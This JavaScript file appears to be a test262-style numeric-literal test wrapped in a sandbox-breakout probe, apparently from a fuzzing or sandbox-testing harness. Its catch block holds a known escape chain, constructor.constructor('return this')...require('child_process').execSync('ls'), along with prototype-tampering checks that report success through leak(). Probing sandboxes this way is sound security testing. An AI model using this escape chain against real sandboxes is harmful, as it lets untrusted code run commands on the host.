try {
    if (0 !== 0) {
        $ERROR('#0: 0.E0 === 0');
    }
    if (1 !== 1) {
        $ERROR('#1: 1.E0 === 1');
    }
    if (2 !== 2) {
        $ERROR('#2: 2.E0 === 2');
    }
    if (3 !== 3) {
        $ERROR('#3: 3.E0 === 3');
    }
    if (4 !== 4) {
        $ERROR('#4: 4.E0 === 4');
    }
    if (5 !== 5) {
        $ERROR('#5: 5.E0 === 5');
    }
    if (6 !== 6) {
        $ERROR('#6: 6.E0 === 6');
    }
    if (7 !== 7) {
        $ERROR('#7: 7.E0 === 7');
    }
    if (8 !== 8) {
        $ERROR('#8: 8.E0 === 8');
    }
    if (9 !== 9) {
        $ERROR('#9: 9.E0 === 9');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}